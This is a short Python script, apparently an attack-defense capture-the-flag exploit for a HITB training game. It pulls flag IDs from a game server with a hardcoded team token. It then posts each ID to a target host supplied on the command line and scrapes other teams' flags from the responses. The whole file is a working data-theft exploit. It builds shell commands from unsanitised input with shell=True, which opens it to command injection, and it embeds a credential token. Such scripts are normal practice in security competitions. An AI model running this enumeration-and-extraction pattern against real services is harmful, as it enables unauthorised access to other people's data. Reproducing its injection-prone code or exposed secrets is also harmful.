#!/usr/bin/env python3
import subprocess
import sys
import json
import re

subprocess.run("curl -s -H 'X-Team-Token: CHECKSYSTEM_30_419b87324c0fa1e0f297605440ac1d9d' https://training.ctf.hitb.org/flag_ids?service=1 | jq . > data.json", shell=True)

host = sys.argv[1]

with open('data.json', 'r') as json_file:
    data = json.load(json_file)

# Проход по каждому элементу в "flag_ids"
for key, value in data["flag_ids"].items():
    team_number = key  # Здесь используйте правильное имя ключа
    flag_list = sorted(value["flag_ids"])  # Сортировка списка

    for flag_id in flag_list:
        response = None  # Инициализация переменной response
        curl_command = f'curl -s -X POST {host} -d user={flag_id} | grep "<b>TEAM.*</b>" -o'
        response = subprocess.run(curl_command, shell=True, capture_output=True, text=True)

        if response:  # Проверка наличия response
            flag_output = response.stdout.strip()
            flag_lines = re.findall(r'<b>(TEAM.*?)</b>', flag_output)
            if flag_lines:
                flag = flag_lines[0]
                print(f"{flag}", flush=True)